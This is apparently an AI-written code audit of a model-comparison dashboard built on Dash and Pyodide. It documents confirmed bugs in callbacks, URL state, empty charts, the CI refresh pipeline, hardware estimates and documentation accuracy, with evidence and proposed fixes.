`app.py:883-887` defines `_VALID_TABS` with a fallback, and its comment records this exact bug being fixed once — **on the Dash side only**. The stale ids are real: `git show 82effa0` is titled *"fix: guard against stale ?tab=insights URL on load"*, and `git log -S` shows `insights`, `performance` and `embeddings` were all live `dcc.Tab` values this app once emitted into share URLs.

**Fix** — `const t = TABS.some(x => x.id === id) ? id : "overview"; switchTab(t);` in `applyUrlState`, plus a defensive guard at the top of `switchTab`.

### 5.2 — Dash's detail panel and its close button are entirely dead `HIGH` `CONFIRMED`

`app.py:1239` declares `Input("quadrant-chart", "clickData")`. I grepped the whole repo: **`quadrant-chart` appears exactly once — that line.** A programmatic layout audit collected 68 string ids from `app.layout` and cross-checked all 23 entries in `GLOBAL_CALLBACK_MAP`: exactly one dependency is unresolvable, and it is this one. End-to-end on the real app: emitting `plotly_click` on `pareto-chart` with real customdata left `detail-panel` at className `detail-panel` and body `''`, console showing `ReferenceError: A nonexistent object was used in an Input of a Dash callback. The id of this object is quadrant-chart`. Control with only that Input removed: `OPENED` / `CLOSED`. `suppress_callback_exceptions=True` (`app.py:107`) suppresses the startup warning, not the runtime ReferenceError.

So a local user reads "Click any bubble for full details" (`app.py:1094`), clicks, and nothing happens — while the public site's equivalent (`docs/app.js:787-806`) works.

**Fix** — delete the Input and the `quadrant_click` parameter (Overview renders the quadrant into `pareto-chart` anyway, `app.py:1085-1089`).
**Verify** — add a test that walks `app.layout`, collects every id, and asserts every callback Input/Output/State id is present. This single test would have caught it.

### 5.3 — The `?q=` contract is broken end-to-end `MED` `CONFIRMED` (merged ×4)

One value, four incompatible representations:

| Where | Behaviour |
|---|---|
| Dash preset | writes `42.1` / `52.7` into a dropdown whose options are `[0,10,…,50]` (`app.py:283-284`) → **the control goes visually blank** (verified: innerText `''`, empty value span) |
| Dash URL write | `app.py:921` writes `q=42.1` |
| Dash URL read | `app.py:907` `int("42.1")` → ValueError → swallowed at `:908` → **`quality = 0`**. Verified: `init_from_url('?tab=overview&q=42.1')` → `('overview', [], 0)`; `'?q=25'` → `25` |
| Static preset | `docs/app.js:703-706` snaps to the nearest `<option>`: p90 52.7 → **50**, p75 42.1 → **40** |
| Static URL read | `docs/app.js:752-755` assigns an unlisted value to a `<select>` → `selectedIndex -1`, `value ""`, `Number("") === 0` at `:436` → **filter silently dropped** |

Measured consequences: "Top 10%" on the public site returns **23/148 = 15.5%** (a 53% overshoot on a button whose label is a precise numeric claim); "Top 25%" returns 27.7%. A Dash "Top 25%" share link opened on the public site shows **11 Anthropic models as if they were the top quartile** — only 8 qualify. Nothing surfaces the drop.

**Fix** — one shared normalisation. Insert the exact percentile as an `<option>` (labelled "≥ 42.1 · top 25%") or replace the `<select>` with a numeric input — the Python already accepts any float (`static_helpers.py:13`). Change `app.py:908` to `float(...)`. Failing to parse a URL param should surface, not reset to 0.

### 5.4 — The public site ships 1 of 14 explanatory captions `MED` `CONFIRMED` (merged ×2)

`app.py` calls `_desc()` 14 times (`:328, 343, 440, 448, 478, 490, 508, 539, 571, 684, 772, 812` + the `1085/1091` callback pair). `docs/app.js` creates exactly one — `#overview-desc` at `:936-942`; `grep -n chart-caption docs/app.js docs/index.html` returns that single hit. `buildTabsAndPanels` (`:94-129`) emits nothing but chart-card divs for the other nine tabs.

Lost on the live site: *"Models within ±2 points of each other are effectively tied — small deltas are within measurement variance"* (`app.py:481-482`); *"Quality floor of 20 so ultra-cheap but weak models don't pollute the list"* (`:492`); *"ELO scores from Artificial Analysis Image Arena — blind human comparisons"* (`:774`); *"Quality scores are human preference ratings (0–100). Price is USD per second"* (`:814-815`).

> One sub-claim refuted: the Table column *does* disclose the blend (`docs/app.js:628` renders `Price ($/M tok, 3:1)`). And the unfiltered Value Leaders neighbour is **not** drift — `app.py:497-498` builds it once from the full df too. Only the caption gap is real.

**Fix** — put the strings in a `CAPTIONS` dict in `static_helpers.py` (already vendored in the bundle), expose via `static_api`, and have `buildTabsAndPanels` emit a `.chart-caption` per tab from it. One source, two readers.

### 5.5 — Smaller drift, all confirmed

| Defect | Evidence | Fix |
|---|---|---|
| Hourly refresh signal consumed by whichever session ticks first | `_cache_mtime` is a module global (`app.py:60`), `data-version` is per-session (`:226`), `_reload_if_stale()` clears the flag as a side effect. Client A `0→1`; B and C `0→0`, while all three get the fresh stat bar. `data-version` gates only `update_overview/treemap/rankings` (`:1079,1104,1117`), so B and C show new counts above stale charts. `update_recommend` also calls `_reload_if_stale` (`:1032`), so one user can consume their own signal. **Dash-only.** | `new_version = _cache_mtime` — content-addressed, so every session converges |
| Overview caption flips to Speed while the Price chart is still drawn | `docs/app.js:822-824` calls `updateOverviewCaption()` unconditionally; `rerenderActiveFilterCharts` returns at `:663` while `!pyReady`. Verified: caption says "Bubble size = affordability (larger = cheaper)" over a chart whose x-axis is still `Price (USD / 1M tokens, blended 3:1…)` — an exactly inverted reading. `docs/figures/quadrant.json` is built (29 KB) and **never fetched** (`grep -c quadrant docs/app.js` → 0) | fetch the pre-built quadrant figure for the pre-boot Speed view |
| Share copies a filter-less URL and overwrites the address bar pre-boot | `window.AF.state` is written only by `readGlobalFilters()` at `docs/app.js:664` — **one line after** the `if (!window.AF.pyReady) return;` guard at `:663`. Verified pre-boot: DOM `{providers:['Anthropic','OpenAI'], minScore:'40'}`, state `{providers:[], minQuality:0}`; Share produced `?tab=overview` and `history.replaceState` rewrote the bar. ↓CSV returned silently at `:724` — no download, no toast, no console output. Pyodide is CDN-loaded (`docs/pyworker.js:13`), so a cold cache or blocked jsDelivr widens the window indefinitely | move `readGlobalFilters()` above the guard; disable ↓CSV until `pyReady` |
| Detail panel survives a tab switch | `switchTab` never touches `#detail-panel`; only `detail-close` clears it (`docs/app.js:766-767`). Verified: after clicking Video Gen, the panel is still `detail-panel open`, 320×762 at the viewport edge, still armed to a text model with a live "+ Add to Compare" | reset className and `window.AF.detailModel` at the top of `switchTab` |
| Speed column uses the visitor's locale separator | `docs/app.js:643` bare `.toLocaleString()`; every sibling cell uses `.toFixed`. `(1234).toLocaleString('de-DE')` = `'1.234'` — a 1000× ambiguity next to `$0.1580`. Dash renders `.0f`. Affects 2 rows today (Mercury 2 1116, Celeris-1 1560) | pin `'en-US'` or drop the separator |
| Table headers show `cursor:pointer` with `sort_action="none"` | Pulled the live props: `sort_action='none'`, `style_header['cursor']='pointer'`, and `row_selectable / column_selectable / editable / hidden_columns / tooltip_header` all unset — the headers are entirely inert. No CSS override exists | remove the cursor, or enable `sort_action="native"` and drop the sort dropdowns |

---

## Theme 6 — Empty states that read as a crash

**Root cause: silent failure.** `components/charts/constants.py:349` already provides `empty_figure(message=...)`, and its own docstring names this exact bug: *"several charts either raised … or returned a bare `go.Figure()`, which renders as Plotly's default WHITE canvas inside a dark dashboard."* Surviving instances:

### 6.1 — Overview/Speed returns a bare `go.Figure()` on an empty filter `MED` `CONFIRMED` (merged ×2)

`quadrant.py:30-31`. Executed: `update_overview(['AI21 Labs'], 10, '', 'speed')` → `data == []`, `layout` keys `['template']` **only**, and that template is Plotly's light default (`paper_bgcolor 'white'`, `plot_bgcolor '#E5ECF6'`). `fig.to_json()` serialises the whole light theme, and `docs/app.js:442` is a bare `Plotly.react(divId, figObj.data, figObj.layout, PLOT_CONFIG)` with no interception — so a **bright white card lands in the middle of the black dashboard** with the caption still saying "Click any bubble for full details."

Not a typo case: I re-measured reachability across every provider × every MIN SCORE option — **24 of 32 providers have at least one score that empties the frame** (AI21 Labs+10, Amazon+25, Cohere+10, IBM+10, Inception+25, InclusionAI+40 …). Siblings all return `paper_bgcolor '#111111'`; rankings/leaderboard/value_leaders even carry messages. `tests/test_chart_contract.py:118-119` asserts only `is not None`.

**Fix** — `return empty_figure("No models match these filters")`. Strengthen the contract test to assert `paper_bgcolor == BG` **and** ≥1 annotation for every builder on an empty frame.

### 6.2 — Video charts render empty furniture and a NaN axis bound `MED` `CONFIRMED`

`build_video_rankings` has no empty guard, and `video_chart.py:24` `max_q = plot_df["quality"].max() or 1` does not save it — pandas returns **NaN, which is truthy**. That NaN escapes at `:105` `range=[40, max_q * HEADROOM]`. Executed `update_video(['Alibaba'],['cinematic'])`: rankings has 2 bar traces with `x=[] y=[]`, the full normal title, and `xaxis range [40, None]`; scatter has 0 traces and a normal title. **36 of 65 provider × tag pairs are empty**, plus three tag pairs with no provider filter at all (tags are AND-ed). The image tab does this correctly.

**Fix** — `if df.empty: return empty_figure("No video models match these filters")` in both video builders; `max_q = plot_df["quality"].max(); max_q = 1 if not (max_q > 0) else max_q`.

### 6.3 — Clearing Compare charts the top 5 while the table below goes blank `MED` `CONFIRMED`

`radar.py:40-47` substitutes the top 5 by quality **before** `plot_df` is computed, so the `empty_figure("Select up to 5 models to compare")` at `:51` — whose comment is about avoiding exactly this — is unreachable for a deliberate clear. Executed `update_compare([],0,'',[],'radar-model-select')`: **5 polar traces** with `raw_table_html == '<div></div>'`. The chart and the table directly beneath it disagree about what is being compared, and the `<select>` is left visibly empty.

**Fix** — move the empty check ahead of the fallback. Keep the top-5 default only for the genuine first render (`app.py:528`).

### 6.4 — `get_local_df` raises `KeyError('family')` on an empty tag filter `LOW` `CONFIRMED`

`data/local_models.py:571` does `df["family"].map(...)` on a column-less frame. `get_local_df(tags=['multilingual'])` → `KeyError: 'family'`. Neither caller surfaces it: `update_local_charts` (`app.py:1213-1229`) has no try/except (graphs keep their previous figures) and `docs/app.js:568-571` catches into `console.error` only. **Not reachable today** — both dropdowns are hardcoded to the four tags that exist — but `'code'` is down to 3 of 97 rows, so one scrape away.

**Fix** — return a correctly-typed empty frame; populate the tag dropdown from the CSV vocabulary.

---

## Theme 7 — The publish pipeline can ship a state nobody authored

**Root cause: silent failure at the CI boundary.** Nothing in the build validates before writing, and the freshness signal is decoupled from the data.

### 7.1 — "Updated just now" is a build timestamp, proven wrong on a real run `HIGH` `CONFIRMED`

The badge's only source is `generated_iso`, set to `datetime.now(timezone.utc)` at **build** time (`build_static.py:82,98`) and printed verbatim by `renderFreshness()` (`docs/app.js:424-431`). No per-dataset scrape status exists in the manifest. The change guard (`refresh.yml:44-52`) fires if *any* file under `data/raw/` moved, and the rebuild+commit+push (`:58-69`) run on that single boolean — with the "Report scrape failures" step deliberately **last** (`:73-77`), i.e. after the lie is published.

Run `31558618824`, 2026-08-12T02:59Z:

```
[scraper] Unexpected API response structure            <- hosted LLM scrape FAILED
[local_scraper] No valid open-weight model rows parsed <- local scrape FAILED
[image_scraper] Saved 148 image models                 <- only image succeeded
data guard OK -> Data-only rebuild complete -> 583ff27..ff0ef24 main -> main   PUSHED
##[error]hosted local served from cache                <- red, AFTER the push
```

Files in `ff0ef24`: `aa_image_models.csv`, `image_faceted.json`, `manifest.json`, `pybundle.zip`. **`aa_models.csv` is absent.** Manifest at that commit: `generated_iso = 2026-08-12T02:59:44Z`. Actual last change to `aa_models.csv`: 2026-08-11T21:47:38Z → **5 h 12 m stale**. `aa_local_models.csv`: 2026-08-11T07:41:41Z → **19 h 18 m stale**. Badge read "just now".

Structural aggravator: `data/scraper.py:39-42` and `data/local_scraper.py:30-33` hit the **byte-identical URL**, so those two always fail together — while the image scraper (different URL, a churning ELO arena) changes almost every hour. Since 2026-08-11: 30 commits touched `aa_image_models.csv` vs 6 and 5 for the other two. **The one dataset that reliably resets the clock is the one least coupled to the other two.**

**Fix** — each scraper writes `{dataset: {ok, fetched_at, rows}}`; fold all three into the manifest; `renderFreshness()` shows the **oldest successful fetch** plus a warning chip when any `ok` is false or any `fetched_at` is >3 h old. Stopgap: gate the `generated_iso` bump on `steps.scrape.outputs.failed == ''`.

### 7.2 — Pre-rendered figures and the browser render disagree on trace order `MED` `CONFIRMED`

`spotlight_split` orders series by `value_counts()` (`constants.py:432-433`), which does not define tie order — and after dedupe the top providers tie at **OpenAI 8 / Google 8 / Mistral 8**. I built a clean venv on `pandas==2.2.3` (the version Pyodide actually ships — I fetched `pyodide-lock.json` for v0.27.7 to confirm) and ran the identical path:

```
pandas 3.0.1 (CI builder): ['Alibaba','NVIDIA','OpenAI','Google','Mistral', …]
pandas 2.2.3 (browser)   : ['Alibaba','NVIDIA','Mistral','Google','OpenAI', …]
```

`requirements.txt:3` pins only `pandas>=2.0.0`, so CI resolves to 3.x while `docs/pyworker.js:13` pins Pyodide v0.27.7. The committed `pareto.json`/`quadrant.json` carry the pandas-3 order, and `docs/app.js:272-274` calls `rerenderActiveFilterCharts()` on the worker `ready` message **with no user action** — so legend entries 3 and 5 swap and bubble z-order changes a few seconds after every page load. Colour/symbol are per-name lookups, so no model changes colour; this is instability, not wrong data.

**Fix** — make the ordering total: `sorted(candidates, key=lambda p: (-counts[p], p))`. Pin `pandas==2.2.3` in `requirements.txt` so pre-render and browser run the same library.
**Verify** — a test asserting a pre-rendered figure equals `static_api`'s render at default filter state.

### 7.3 — `--data-only` refreshes figures from new code but leaves the in-browser Python stale `MED` `CONFIRMED`

`refresh.yml:60` only ever runs `build_static.py --data-only` → `rebuild_data_only()` (`:239-244`) = `export_default_figures` + `copy_css` + `swap_bundle_csvs`. `export_default_figures` imports the chart builders **from the working tree**, while `swap_bundle_csvs` (`:224-231`) passes every non-CSV member through byte-for-byte. `build_pybundle()` is never called by CI, and `refresh.yml` is the only workflow.

I reproduced the hazard end to end: copied the tree to scratch, edited `_ZONE` in `quadrant.py` to `rgba(255,0,0,0.99)`, ran the exact CI command:

```
docs/figures/quadrant.json  shapes fillcolor -> rgba(255,0,0,0.99)      NEW code
docs/pybundle.zip quadrant.py -> _ZONE = "rgba(255,255,255,0.02)"      OLD code
```

So a chart fix pushed without a full build looks correct on load and **visibly reverts the first time a visitor touches a filter**. No drift right now (31 project `.py` in the bundle, 0 differ) only because `b9d6e19` was a manual full build — CI cannot produce that state on its own.

**Fix** — hash the bundle's project `.py` members against the working tree at the top of the refresh job; fail (or fall back to a full build) on mismatch. ~31 files, milliseconds.

### 7.4 — Build writes before it validates `MED` `CONFIRMED`

`main()` runs `export_default_figures(FIG)` (`:248`), `copy_css()` (`:249`), `.nojekyll` (`:250`) **before** `build_pybundle()` (`:251`), and the only environment validation (`_assert_lean_plotly`) lives inside the latter at `:176`. I ran both halves: `_assert_lean_plotly` on the miniforge plotly raises `RuntimeError: … 13329 generated validator modules (>500)`, while `export_default_figures` under that same interpreter completes and writes all 13 figures — in the pandas-2 order. Net: 13 figures + CSS replaced, then a traceback, then non-zero exit, with `pybundle.zip` left at the previous build's code.

> Corrected: `manifest.json` **is** bumped (`build_static.py:99`), so the finder's "no client is told to reload" was backwards. The real half-state is fresh figures + fresh manifest + stale bundle.

Related, same class: `build_pybundle` opens the **published** artifact for truncating write (`:187`) and only checks the size budget after the context manager closes (`:207-214`) — I confirmed by setting `MAX_BUNDLE_MB=0.001`: it raises, and the rejected 4 MB file is still sitting at the publish path. Any interrupt during the ~1,665-member loop leaves a truncated zip, which makes `pyworker.js:60` throw and the page show "interactivity unavailable". `swap_bundle_csvs` (`:222-235`) already demonstrates the correct tmp+replace+unlink pattern.

**Fix** — validate the environment at the top of `main()`; build into a staging dir and swap atomically; build the bundle into `.zip.tmp`, assert the size there, then `replace`.

### 7.5 — Running pytest rebuilds and dirties the published site `MED` `CONFIRMED`

`tests/test_build_static.py:33,47,56,63` shell out with `cwd=ROOT` while `build_static.py:41` hardcodes `DOCS = ROOT/"docs"`. The tests accept a `tmp_path` fixture (`:31`) and never use it. Evidence from the orchestrator's run is still on disk: `git status --porcelain` → ` M docs/figures/manifest.json`, ` M docs/pybundle.zip`, all 14 figure JSONs stamped with the pytest run time. I diffed both: the manifest changed only `{version, generated, generated_iso}`; the 4 MB zip has **1,665 members each, identical name set, 0 members with differing bytes — only member order** (the 3 CSVs move to the end because `swap_bundle_csvs` appends them).

With CLAUDE.md's "commit and push after EVERY successful change", a test run republishes the site. Under a different pandas it republishes the whole figure set with reordered traces (§7.2).

**Fix** — parameterize the output root and point the tests at `tmp_path`. Make `swap_bundle_csvs` write each fresh CSV at the position of the one it removed so a no-op refresh is byte-identical.

### 7.6 — `source ai-frontier/bin/activate` silently activates nothing `MED` `CONFIRMED`

`ai-frontier/bin/activate:41` has `NU 25-26 /Spring` (stray space); `pyvenv.cfg` carries the same. `$VIRTUAL_ENV/bin` doesn't exist, so the PATH prepend at `:44` is a no-op — but the script exits 0 and still sets the `(ai-frontier)` prompt:

```
exit=0   which python -> /Users/avosarkissian/miniforge3/bin/python
sys.prefix=/Users/avosarkissian/miniforge3   3.10.14   plotly 6.0.0   pandas 2.2.2
(real venv: 3.11.5 / plotly 6.5.2 / pandas 3.0.1)
```

`README.md:102` documents this exact command, then tells you to `pip install -r requirements.txt` and `python build_static.py` — which lands you in §7.4 and §7.2 simultaneously. Blast radius is this one machine (the venv is gitignored) — which happens to be the machine that publishes the site.

**Fix** — recreate the venv. Add a guard at the top of `build_static.py` that refuses to run unless `sys.prefix` is the project venv, or at minimum prints interpreter/plotly/pandas versions.

### 7.7 — Repo bloat and cadence

- **`docs/pybundle.zip` is 93% of git object storage** `MED` `CONFIRMED` (merged ×2). My own measurement: total blob disk 217.9 MB, bundle **202.6 MB across 314 versions (93.0%)**; 314 of 468 commits touch it; `git show --stat 9ec4064` → `Bin 4039819 -> 4039804 bytes` for a CSV-only change. The three swapped CSVs total 55,514 bytes inside a 4,040,968-byte DEFLATEd zip — **73× write amplification** that git cannot delta. Bundle commits/day Aug 3–11: `2,2,3,4,1,2,10,16,19`. *Corrected:* a real clone is **44 MB**, not 266 MB — the 266 MB is local loose objects that never travel. Steady state ≈2.6 MB/day, not 4. **Fix:** emit the CSVs as `docs/data/*.csv` fetched by the Pyodide bootstrap, so the bundle changes only when code changes; or publish `docs/` via `actions/deploy-pages` so the artifact never enters `main`.
- **"Hourly" is 56% of the time** `LOW` `CONFIRMED`. Re-measured 199 scheduled runs over 356.2 h: **56% of the advertised cadence, median gap 1.65 h, max 6.03 h, 65 gaps >2 h**, minute-of-hour scattered across 55 values (never the `:23` `refresh.yml:4` requests). Normal GitHub best-effort cron — but combined with §7.1 there is no way to distinguish "cron dropped" from "upstream down". **Fix:** schedule `3,23,43 * * * *` (the change guard makes redundant runs nearly free) or soften the copy; give the badge a >3 h threshold colour.
- **`_load_coverage` swallows parse/IO errors** `LOW` `CONFIRMED`. `build_static.py:34-37` returns `{}` on `ValueError|OSError`; `docs/app.js:85` then restores the plain "Models tracked" label, **deleting the "· 14 not carried" disclosure the block exists to publish**. Proved by pointing `__file__` at a truncated then unreadable file. **Fix:** distinguish "no file yet" (fine) from "file present but unreadable" (fail the build).

---

## Theme 8 — Local-hardware modelling

The Run Local and Agent Stack tabs are labelled "estimated", which covers a lot — but two defects are contradictions the code proves against itself, and one is a recommendation that contradicts its own card.

### 8.1 — "Fast" tier scoring never reads latency `HIGH` `CONFIRMED`

`_score_fast_api` (`stack_recommender.py:108-113`) is `q*0.45 + v*0.30 + s*0.25`. Verified: `_score_fast_api.__code__.co_names == ()` and `co_consts` contains only `quality/price/speed` — **`latency` appears nowhere**. `_API_TIERS[0]` has `min_speed: 30` and no latency floor. Yet `_api_row_html:578,587` renders a TTFT chip.

Default page state (`app.py:433`, `docs/index.html:219-225` — Anthropic/Google/OpenAI, **no interaction required**), tags stripped:

```
Fast | API | Sub-agent workhorse — cheap, high-throughput, parallel calls
  GPT-5.6 Luna (max)   52.3  OpenAI  $0.950/M  162 tok/s  57.45s TTFT
  GPT-5.6 Luna (xhigh)                                     30.84s TTFT
  …
USE CASES · Run in parallel across many files
```

The same eligible pool contains `GPT-5.6 Luna (low)` at **1.63 s** TTFT / 164.8 tok/s / identical $0.95, and `(medium)` at 2.19 s — strictly better for the stated purpose, ranked 6th and 7th because quality dominates at 0.45. Across all 528 one/two-provider selections: Fast pick TTFT >10 s in **29**, worse than the *Balanced* pick in **11**.

**Fix** — add `1 - min(latency, cap)/cap` at ~0.20–0.25 weight (take it from `s`), and/or `"max_latency": 5.0` in the tier config filtered alongside `min_speed`. Collapse reasoning-effort variants of one base model so a single family can't fill 3 of 5 slots.
**Verify** — assert the Fast pick's TTFT is ≤ the Balanced pick's, for every provider selection.

### 8.2 — VRAM has no context/KV term while the docstring claims it does `MED` `CONFIRMED`

`calc_vram_gb(params_b, quant)` — `inspect.signature` confirms two args; `get_local_df` has no context parameter and `'context_k' in getsource(get_local_df)` is **False**. Proved empirically: for one model at each of the 14 distinct `context_k` values (8k … 10,000k), `vram_req_gb == params_b * 0.5 * 1.18` to the cent every time. Yet `data/local_models.py:9` states the formula is "params_b × bytes_per_weight × OVERHEAD_FACTOR" and `:34-35` labels `_OVERHEAD = 1.18` the **"KV-cache + activation overhead multiplier"**.

The concrete UI case: RTX 5080 (16 GB) at Q4, all three tiers recommend `Gemma 4 26B A4B (Reasoning)` at `vram_req=14.87 GB`, `fits="yes"`, and `local_compat.py` hovertemplate prints **"VRAM needed: 14.9 GB" two lines above "Context: 256k tokens"**.

> The finding's KV-cache percentages rest on published architectures for models that are **not in the live catalogue** (they exist only in the dead `_MODELS_RAW` fallback), so treat the magnitudes as unverified. The direction is unarguable and the juxtaposition is the real defect.

**Fix** — minimum viable: stop printing max context next to a context-free VRAM figure; state the assumed context in the subtitle and hover ("fits at Nk context"). Full: add `context_tokens` to `calc_vram_gb`/`get_local_df` with per-model `n_layers`/`n_kv_heads`/`head_dim`.

### 8.3 — Multi-GPU multiplies bandwidth by `1 + 0.85(n−1)` `MED` `CONFIRMED`

`eff_bw = bandwidth * (1 + (gpu_count-1)*0.85)`, copy-pasted verbatim into **four** places: `app.py:1059`, `app.py:1218`, `static_api.py:316`, `static_api.py:403`. `grep -rn '0.85'` returns exactly those four, with no comment or caveat. Llama-70B-Q4 on an RTX 4090:

```
x1  1008 GB/s -> 13.4 tok/s      x4  3578 -> 47.7 (3.55x)
x2  1865      -> 24.8 (1.85x)    x8  7006 -> 93.3 (6.95x)
```

The contradiction is provable from the code alone, no benchmark needed: `app.py:1055` pools VRAM as `vram_per_gpu * num_gpus` (layer-split) while `:1059` sums bandwidth (tensor-parallel). Mutually exclusive deployments in three consecutive lines.

**Fix** — keep the VRAM pooling, leave `eff_bw` at single-card bandwidth, and label the control "pools VRAM; does not increase single-stream speed". Hoist the expression into one helper in `data/local_models.py` so four copies can't drift.

### 8.4 — Local "Balanced" degenerates into "max quality" `MED` `CONFIRMED`

`_pick_local_tier` balanced branch (`:162-170`) adds `(quality/q_max)*0.70` — min-max normalized — to `(1/vram_req_gb)*0.30`, a **raw reciprocal in GB, never normalized**. Measured on an RTX 4090 Q4: q_term spread **0.474**, v_term spread **0.095** — the VRAM term's entire dynamic range is a fifth of the quality term's, so the argmax is the argmax of quality, which is the Reasoning tier's sort key (`:172`).

Swept all 137 GPU presets at Q4: **Balanced == Reasoning on 90/137 (66%)**; all three tiers identical on **27/137 (20%)**. All six quant levels on a 4090: 6/6. The default RTX 5090 preset is affected.

Compounding it: `select_stack` (`:428-465`) never de-duplicates across tiers and always prints the fixed `_TIER_ADVICE` (`:67-83`). Rendering DeepSeek-only: `DeepSeek V4 Flash 0731` heads all three cards at an identical $0.1575/M and 60 tok/s, while the page simultaneously asserts *"Lower reasoning depth — not suitable for complex logic"*, *"More expensive than Fast"* and *"Slowest and most expensive"* about that one model. **11 of 32 single-provider selections** collapse all three tiers in API mode; **27 of 137** GPU presets in local mode.

**Fix** — normalize the VRAM term into [0,1] before weighting; exclude a higher tier's pick from the lower tier's candidate pool; when a repeat is unavoidable, render "Same model as Fast — this provider's catalogue does not differentiate at this tier" and suppress the now-false advice lines.

### 8.5 — Demoted: two calibration constants I could not prove wrong

- **MoE speed uses active params only** `PLAUSIBLE`. The code fact is confirmed (`data/local_models.py:498` reads `active_b` only, so always-resident attention/shared-expert/embedding weights are excluded) and the effect is large (`Qwen3.6 35B A3B` 313.2 tok/s vs dense `Qwen3.6 27B` 33.8 — a 9.3× gap derived purely from 36B/3B). But the calibration table was computed against models that **are not in the live catalogue** (`_MODELS_RAW` only), and the "real ~120-180 tok/s" column is external. The sweep claim is also wrong: A3B is the Fast pick on **26 of 48** NVIDIA presets, not all.
- **`_EFF['apple'] = 0.82` > `_EFF['nvidia'] = 0.55`** `PLAUSIBLE`. The behaviour reproduces exactly (M3 Ultra 141.8 tok/s = **1.21× an RTX 4090** on the same model), and the cross-vendor inversion is suspicious. But nothing in the repo pins these constants — no benchmark, fixture or test — and the "true value is 0.38–0.46" claim rests on published mlx-lm figures I cannot execute. Affects 56 of 137 presets (not 60).

**Recommendation:** don't act on the magnitudes. Do record, in the comment block at `data/local_models.py:38-42`, which benchmark each constant was fit to — the absence of that provenance is why neither claim can be settled.

---

## Theme 9 — Docs and deliverables describe a different product

Not correctness of code, but every item here is a checkably false statement shipped to a reader.

| # | Claim | Reality | Fix |
|---|---|---|---|
| 9.1 | `README.md:3,36,73` — "300+ large language models" ×3 | **148** (my run: 148 rows / 32 providers; manifest `model_count=148`). History confirms the cliff: `2026-07-24 = 329`, `07-25 = 154`, `08-11 = 148`, and `data_guard.py:6-11` documents that exact event. "30+ providers" is still true. `:73` even claims counts are "always visible live in the header stats" — the header says 148 | replace with a live figure, or have `build_static.py` stamp it in |
| 9.2 | `report.tex` — the graded deliverable | Five independently false claims: `:34` "255+ models across 29 providers … eleven specialized views" (148/32, 10 tabs); `:146,228,239` "eleven tabs" (`grep 'dcc.Tab('` → exactly 10 at 311,341,438,460,506,537,569,682,770,810; `docs/app.js` TABS → 10; `README.md:22` correctly says 10); `:157,92` a "Trends" tab (`grep build_trends\|price_timeline\|embedding_chart` across all entry points → **zero hits**); `:102-110` "manually curated … static rather than live" (contradicted by `data/local_scraper.py:1-4`, `local_models.py:513`, hourly `refresh.yml:38`, and `README.md:70`); `:258,264,378-381` "a single Python process that Render starts with `python app.py`" (static Pages + Pyodide since 2026-06-23) | regenerate numbers from `coverage.json`; delete the Trends section; rewrite the local-data and deployment sections |
| 9.3 | `screenshots/*.png`, embedded at `README.md:14,47-56` | Hero image reads **"324 MODELS TRACKED / $0.010 FLOOR / 59.9 PEAK"** vs today's 148 / $0.080 / 63.0 — almost certainly the origin of the "300+" claim. Also structurally older: x-axis lacks the "blended 3:1" clause, no "· N not carried" note, a 21-provider legend (pre-`spotlight_split`), and a several-hundred-point scatter (pre-`dedupe_to_best_variant`). `table.png` shows Claude Opus 4.8, GPT-5.5 (xhigh), Claude Opus 4.7/4.6, GPT-5.4 (xhigh) — none exist in the CSV | regenerate all six; crop the header out so a data refresh can't invalidate them |
| 9.4 | `README.md:30` / `report.tex:238-240` — "Color and marker shape both encode provider for colorblind accessibility" | The palette **does** cover all 32 providers (0 colour collisions, 0 shape collisions), but `pareto.py:61` calls `spotlight_split`, capped at 9 (`constants.py:88-91,227`). Decoding `docs/figures/pareto.json`: the "Other" trace holds **30 of 95 bubbles** in one grey `#6b7280` circle — Kimi, Z AI, MiniMax, Xiaomi, Tencent, Cohere, IBM, Microsoft and 15 more. The colorblind framing promises a redundant encoding that is absent for 23 of 32 providers | reword to "the nine largest providers each get a distinct colour and shape; the rest share 'Other'" |
| 9.5 | Overview caption "Each bubble is one model" (`app.py:329,1092`, `docs/app.js:810`) | I confirmed: **95 markers for a 148-row frame** on both `build_pareto_scatter` and `build_quadrant` (`dedupe_to_best_variant` at `pareto.py:52`, `quadrant.py:28`). The published `pareto.json` decodes to the same 95. Meanwhile the header tile says 148 and the Landscape treemap says OpenAI ships **25** models while Overview draws **8** of them. Searching "Claude Opus 5" → 5 rows in frame, **1 bubble**; "Luna" → 6 rows, 1 bubble. *Correction:* all six GPT-5.6 Sol tiers are priced identically, and only 6 of the 33 collapsing families have any price variation — the dropped variants are dominated near-duplicates, so the "lost purchasable SKUs" framing overstates it. The false caption and cross-tab contradiction are the real defect | change the caption to "one model family (best-scoring variant)" and add "· 95 of 148 shown" to the subtitle — `app.py:329`, `app.py:1092`, `docs/app.js:810` must move together |
| 9.6 | Budget tab prices 100% of tokens at the 3:1 output blend | `cost_calc.py:24` is the entire cost model. `price_in`/`price_out` exist in the frame and are used **only for a hover string** (`:213-225`). Blended/input ratio: median **3.52×**, max 9.42×, 100/148 rows ≥3×. Claude Opus 5 at 100M: charted **$2000.00**, all-input **$500.00**. GPT-5.6 Sol (max): $2375 vs $500 (**4.75×**). `app.py:539-542` explains the blend; the **public site has no such text on the Budget tab** — grep finds only the Table tooltip and the Overview caption — while `docs/app.js:522-528` prints "$2000.00 / mo" as a headline card | add an output-share slider (default 75% for parity) and compute `tokens*(in_share*price_in + out_share*price_out)`; at minimum render the assumption on the Budget panel |
| 9.7 | Video Gen under a global "Updated N ago" badge | `data/video_models.py` is a hand-written list, 2 commits ever (`d591391` 2026-03-13 content; `869de38` 2026-08-11 palette only — I read the diff). 20 models, all 2025-era (Veo 2/3, Sora HD/Turbo, Kling 1.6, Gen-3 Alpha, Wan 2.1, SVD 1.1), identical in the published `video_rankings.json`, while the LLM tabs carry GPT-5.6 and Claude Opus 5. `README.md:71` discloses "not live-scraped"; **nothing on the site does** | scope the badge per tab, or add "curated dataset · last updated `<date>` · not live-scraped" to the subtitle |
| 9.8 | `README.md:37` — Run Local tags "(code, reasoning, vision, **multilingual**)" | App offers Code/Reasoning/Vision/**Audio** (`app.py:729-739`, `docs/index.html:161-166`). Live counts: `{reasoning:52, vision:50, audio:10, code:3}` — no `multilingual`. The README documents the pre-fix version of a control the code fixed *and commented* | one-word edit |
